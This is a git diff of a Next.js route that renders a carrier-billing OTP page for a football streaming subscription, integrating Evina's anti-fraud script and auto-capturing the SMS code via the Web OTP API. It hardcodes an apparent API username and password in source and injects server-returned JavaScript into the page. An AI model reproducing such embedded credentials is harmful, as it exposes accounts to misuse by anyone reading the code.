@@ -1,5 +1,19 @@
 import { NextRequest } from 'next/server';
 
+const PIN_REQUEST_URL =
+  'https://vivavas1.future-club.com/fcc-evina-pin-flow-apis/PinRequest';
+
+const SERVER_PARAMS = {
+  UserId: '166',
+  Password: 'Mobility_MI@123',
+  ProductId: '479',
+  TelcoId: '7',
+  ShortCode: '50995',
+  ConfirmButtonHTMLId: 'confirmBtn',
+  CampaignURL: '',
+  ContentURL: '',
+};
+
 export async function GET(request: NextRequest) {
   const { searchParams } = new URL(request.url);
   const msisdn = searchParams.get('msisdn') || '';
@@ -10,14 +24,92 @@ export async function GET(request: NextRequest) {
     return new Response('Missing msisdn or trxId', { status: 400 });
   }
 
+  const userAgent = request.headers.get('user-agent') || '';
+
+  // ── Server-side PinRequest ──────────────────────────────────────────────
+  // MUST be server-side so Evina JS is in the HTML from the start.
+  // Evina DCBProtect needs to load during page parsing (before DOMContentLoaded)
+  // so its event listeners initialize properly. Without this, the carrier's
+  // Evina-integrated PinVerify endpoint rejects with error 2804.
+  let evinaJs = '';
+  let pinRequestOk = false;
+
+  try {
+    const pinRes = await fetch(PIN_REQUEST_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        MSISDN: msisdn,
+        TransactionId: trxId,
+        Headers: userAgent,
+        UserIP: userIP,
+        ...SERVER_PARAMS,
+      }),
+      signal: AbortSignal.timeout(10000),
+    });
+
+    const pinText = await pinRes.text();
+    let pinData: Record<string, unknown>;
+    try {
+      pinData = JSON.parse(pinText);
+    } catch {
+      pinData = {};
+    }
+
+    const status = String(pinData.Status ?? pinData.status ?? '');
+    const rawJs = String(pinData.JS ?? pinData.js ?? '');
+
+    console.log('[OTP Page] PinRequest Status:', status, 'JS length:', rawJs.length);
+
+    if (status === '0') {
+      pinRequestOk = true;
+      evinaJs = rawJs.trim()
+        .replace(/^<script[^>]*>/i, '')
+        .replace(/<\/script\s*>$/i, '')
+        .trim();
+    }
+  } catch (err) {
+    console.error('[OTP Page] PinRequest error:', err);
+  }
+
   const masked = msisdn.length > 5
     ? `+${msisdn.slice(0, 3)} ${msisdn.slice(3, 5)}***${msisdn.slice(-3)}`
     : msisdn;
 
-  const html = `<!DOCTYPE html>
+  // Safely encode Evina JS for embedding in HTML script tag
+  // JSON.stringify handles JS string escaping; then prevent </script> in HTML
+  const evinaJsonSafe = evinaJs
+    ? JSON.stringify(evinaJs).replace(/<\//g, '<\\/')
+    : 'null';
+
+  // ── Build HTML ──────────────────────────────────────────────────────────
+  // Split into two template literals with Evina JSON concatenated in between
+  // so arbitrary Evina JS content (backticks, ${}) doesn't break template literals
+  const htmlBeforeEvina = `<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
+  <script>
+    // ── Web OTP listener — start ASAP in <head> before SMS arrives ──
+    // SMS is triggered by server-side PinRequest (already called).
+    // SMS delivery takes ~5s, page loads in ~1-2s → listener starts 3-4s before SMS.
+    var __webOtpAbort = null;
+    var __webOtpCode = null;
+    if ('OTPCredential' in window) {
+      __webOtpAbort = new AbortController();
+      navigator.credentials.get({
+        otp: { transport: ['sms'] },
+        signal: __webOtpAbort.signal
+      }).then(function(otp) {
+        if (otp && otp.code) {
+          __webOtpCode = otp.code;
+          if (window.__handleWebOtp) window.__handleWebOtp(otp.code);
+        }
+      }).catch(function(err) {
+        if (window.__handleWebOtpError) window.__handleWebOtpError(err);
+      });
+    }
+  <\/script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>XoomSports — Verify</title>
   <style>
@@ -346,13 +438,12 @@ export async function GET(request: NextRequest) {
     .pulse { animation: pulse 2s ease-in-out infinite; }
     .phase-hidden { display: none !important; }
   </style>
-  <!-- Evina JS will be injected dynamically after PinRequest -->
 </head>
 <body>
   <div class="bg-glow"></div>
 
   <!-- Evina required elements -->
-  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - Télécharger - CONTINUER - ENTRER - S'ABONNER - اشترك الآن - VOIR - ACCEPT - اشترك الان - الاشتراك</a>
+  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - VALIDER - BUY - SUBSCRIBE - DEVAM ET - j'en profite - T\u00e9l\u00e9charger - CONTINUER - ENTRER - S'ABONNER - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0622\u0646 - VOIR - ACCEPT - \u0627\u0634\u062a\u0631\u0643 \u0627\u0644\u0627\u0646 - \u0627\u0644\u0627\u0634\u062a\u0631\u0627\u0643</a>
   <input id="otpValue" type="text" style="position:absolute;left:-9999px;opacity:0" tabindex="-1" autocomplete="off">
   <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>
 
@@ -381,9 +472,9 @@ export async function GET(request: NextRequest) {
             <h2>Watch Live Football<br><em>Anytime, Anywhere</em></h2>
             <p>All leagues &bull; All matches &bull; HD streaming</p>
             <div class="feature-list">
-              <div class="feature-tag">⚽ Premier League</div>
-              <div class="feature-tag">🏆 UCL</div>
-              <div class="feature-tag">📺 HD</div>
+              <div class="feature-tag">\u26bd Premier League</div>
+              <div class="feature-tag">\ud83c\udfc6 UCL</div>
+              <div class="feature-tag">\ud83d\udcfa HD</div>
             </div>
           </div>
         </div>
@@ -469,6 +560,12 @@ export async function GET(request: NextRequest) {
     </div>
   </div>
 
+  <!-- Evina DCBProtect — executes during parsing so DOMContentLoaded listeners work -->
+  <script>var __evinaCode=`;
+
+  // Evina JSON is concatenated (NOT in template literal) to avoid backtick/${} issues
+  const htmlAfterEvina = `;if(__evinaCode){var _s=document.createElement('script');_s.textContent=__evinaCode;document.head.appendChild(_s);}<\/script>
+
   <script>
     // ── State ───────────────────────────────────────────────────────────────
     var MSISDN = ${JSON.stringify(msisdn)};
@@ -477,8 +574,11 @@ export async function GET(request: NextRequest) {
     var isVerifying = false;
     var resendCooldown = 0;
     var phase = 1;
-    var pinRequestDone = false;
-    var evinaReady = false;
+    var pinRequestDone = ${pinRequestOk};
+    var evinaReady = ${pinRequestOk && evinaJs.length > 0};
+
+    // Take over Web OTP controller from <head> script
+    var webOtpAbort = (typeof __webOtpAbort !== 'undefined') ? __webOtpAbort : null;
 
     var pins = document.querySelectorAll('.otp-input');
     var confirmBtn = document.getElementById('confirmBtn');
@@ -505,7 +605,9 @@ export async function GET(request: NextRequest) {
     }
 
     dbg('Session: msisdn=' + MSISDN + ' trxId=' + TRXID);
-    dbg('DOM check: confirmBtn=' + !!document.getElementById('confirmBtn') + ' otpValue=' + !!document.getElementById('otpValue'));
+    dbg('PinRequest: server-side=' + pinRequestDone + ' evina=' + evinaReady);
+    dbg('Web OTP: head-listener=' + (typeof __webOtpAbort !== 'undefined'));
+    dbg('DOM check: confirmBtn=' + !!confirmBtn + ' otpValue=' + !!otpValue);
 
     // ── OTP Input handling ────────────────────────────────────────────────
     function getFullPin() {
@@ -570,7 +672,6 @@ export async function GET(request: NextRequest) {
     // ── Phase transitions ───────────────────────────────────────────────────
     var otpPollTimer = null;
     var otpTimeout = null;
-    var webOtpAbort = null;
 
     function goToPhase2() {
       phase = 2;
@@ -607,19 +708,19 @@ export async function GET(request: NextRequest) {
         }
       }, 400);
 
-      // Show manual entry after 15 seconds — but keep Web OTP listener alive
-      // so the Chrome "Allow" dialog stays visible for the user to tap
+      // Show manual entry after 15 seconds — keep Web OTP listener alive
       otpTimeout = setTimeout(function() {
         dbg('Auto-verify timeout (15s) — showing manual entry (Web OTP still listening)');
         clearInterval(otpPollTimer);
-        // DO NOT abort webOtpAbort here — let Chrome dialog stay visible
         showManualEntry();
       }, 15000);
 
-      // IMPORTANT: Call PinRequest NOW (after Web OTP listener is already active)
-      // This ensures SMS arrives AFTER the listener is set up
+      // If PinRequest failed server-side, call it client-side as fallback
       if (!pinRequestDone) {
+        dbg('PinRequest was not done server-side — calling client-side fallback');
         callPinRequest();
+      } else {
+        dbg('PinRequest already done server-side — SMS should arrive shortly');
       }
     }
 
@@ -648,37 +749,34 @@ export async function GET(request: NextRequest) {
       dbg('Manual OTP entry — waiting for user input');
     }
 
-    // ── Start Web OTP FIRST (before PinRequest triggers SMS) ────────────
-    if ('OTPCredential' in window) {
-      dbg('Web OTP API: setting up listener (started on page load)...');
-      webOtpAbort = new AbortController();
-      navigator.credentials.get({
-        otp: { transport: ['sms'] },
-        signal: webOtpAbort.signal
-      }).then(function(otp) {
-        if (!otp || !otp.code) {
-          dbg('Web OTP: User denied or no SMS');
-          return;
-        }
-        var code = otp.code.replace(/\\D/g, '').slice(0, 4);
-        dbg('Web OTP: Got code "' + code + '" — auto-verifying');
-        if (code.length >= 4) {
-          if (phase === 1) { goToPhase2(); }
-          captureAndVerify(code);
-        }
-      }).catch(function(err) {
-        dbg('Web OTP error: ' + (err.message || err));
-      });
-      dbg('Web OTP listener ACTIVE — now safe to trigger SMS');
+    // ── Web OTP callback — handle code from <head> listener ────────────
+    window.__handleWebOtp = function(rawCode) {
+      var code = rawCode.replace(/\\D/g, '').slice(0, 4);
+      dbg('Web OTP: Got code "' + code + '" from Chrome dialog');
+      if (code.length >= 4) {
+        if (phase === 1) { goToPhase2(); }
+        captureAndVerify(code);
+      }
+    };
+    window.__handleWebOtpError = function(err) {
+      dbg('Web OTP error: ' + (err.message || err));
+    };
+
+    // Check if Web OTP already captured a code during page load
+    if (typeof __webOtpCode !== 'undefined' && __webOtpCode) {
+      dbg('Web OTP: code was captured during page load!');
+      window.__handleWebOtp(__webOtpCode);
+    } else if (typeof __webOtpAbort !== 'undefined' && __webOtpAbort) {
+      dbg('Web OTP listener ACTIVE (started in <head>)');
     } else {
       dbg('Web OTP API not available');
     }
 
-    // ── PinRequest: call via client-side fetch (triggers SMS) ────────────
+    // ── PinRequest client-side fallback (for retry/resend) ────────────
     function callPinRequest() {
       if (pinRequestDone) return;
       pinRequestDone = true;
-      dbg('Calling PinRequest via fetch (triggers SMS)...');
+      dbg('Calling PinRequest via client-side fetch...');
 
       fetch('/api/pin-request', {
         method: 'POST',
@@ -692,26 +790,26 @@ export async function GET(request: NextRequest) {
       })
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        var rawKeys = data.raw ? Object.keys(data.raw).join(',') : 'none';
-        dbg('PinRequest response: Status=' + data.Status + ' JS_len=' + (data.JS || '').length + ' keys=' + rawKeys);
+        dbg('PinRequest response: Status=' + data.Status + ' JS_len=' + (data.JS || '').length);
 
-        // Inject Evina JS if returned
-        var js = (data.JS || '').trim()
-          .replace(/^<script[^>]*>/i, '')
-          .replace(/<\\/script\\s*>$/i, '')
-          .trim();
+        // Inject Evina JS if returned (and not already loaded)
+        if (!evinaReady) {
+          var js = (data.JS || '').trim()
+            .replace(/^<script[^>]*>/i, '')
+            .replace(/<\\/script\\s*>$/i, '')
+            .trim();
 
-        if (js.length > 0) {
-          dbg('Injecting Evina JS (' + js.length + ' chars)');
-          var script = document.createElement('script');
-          script.textContent = js;
-          document.head.appendChild(script);
-          evinaReady = true;
+          if (js.length > 0) {
+            dbg('Injecting Evina JS (' + js.length + ' chars)');
+            var script = document.createElement('script');
+            script.textContent = js;
+            document.head.appendChild(script);
+            evinaReady = true;
+          }
         }
 
         if (data.Status !== '0') {
-          dbg('PinRequest failed with status: ' + data.Status + ' — retrying with new trxId');
-          // Retry with new transaction ID
+          dbg('PinRequest failed: ' + data.Status + ' — retrying');
           pinRequestDone = false;
           TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
           dbg('New trxId: ' + TRXID);
@@ -721,8 +819,7 @@ export async function GET(request: NextRequest) {
         }
       })
       .catch(function(err) {
-        dbg('PinRequest fetch error: ' + err);
-        // Retry once
+        dbg('PinRequest error: ' + err);
         pinRequestDone = false;
         TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
         setTimeout(function() { callPinRequest(); }, 1000);
@@ -735,7 +832,7 @@ export async function GET(request: NextRequest) {
       try { window.XoomApp.onPageReady(); } catch(e) {}
     }
 
-    dbg('Flow: Web OTP listener on page load → user clicks Start → PinRequest triggers SMS → auto-capture');
+    dbg('Flow: PinRequest=' + (pinRequestDone ? 'server-side' : 'pending') + ' → Web OTP in <head> → user clicks Start → auto-capture');
 
     // ── Confirm button ──────────────────────────────────────────────────────
     confirmBtn.addEventListener('click', function(e) {
@@ -750,7 +847,13 @@ export async function GET(request: NextRequest) {
         }
         dbg('Manual verify — pin="' + pin + '"');
         if (pin.length !== 4 || isVerifying) return;
-        verifyPin(pin);
+        // Delay 2s to let Evina process the click event and validate
+        isVerifying = true;
+        confirmBtn.innerHTML = '<div class="spinner"></div> <span>Verifying...</span>';
+        dbg('Waiting 2s for Evina validation...');
+        setTimeout(function() {
+          verifyPin(pin);
+        }, 2000);
       }
     });
 
@@ -768,7 +871,7 @@ export async function GET(request: NextRequest) {
       })
       .then(function(r) { return r.json(); })
       .then(function(data) {
-        dbg('PinVerify → Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
+        dbg('PinVerify -> Status="' + data.Status + '" raw=' + JSON.stringify(data.raw || {}));
         if (data.Status === '0' || data.Status === '103') {
           dbg('SUCCESS — redirecting');
           document.getElementById('stepDot3').classList.add('active');
@@ -800,9 +903,9 @@ export async function GET(request: NextRequest) {
     function handleResend() {
       if (resendCooldown > 0) return;
       dbg('Resending OTP...');
-      // Reset and call PinRequest again with new trxId
       TRXID = 'MM' + Math.random().toString(36).toUpperCase().slice(2, 14);
       pinRequestDone = false;
+      evinaReady = false;
       dbg('New trxId for resend: ' + TRXID);
 
       // Restart Web OTP listener
@@ -837,9 +940,11 @@ export async function GET(request: NextRequest) {
         }
       }, 1000);
     }
-  </script>
+  <\/script>
 </body>
 </html>`;
+
+  const html = htmlBeforeEvina + evinaJsonSafe + htmlAfterEvina;
 
   return new Response(html, {
     headers: {
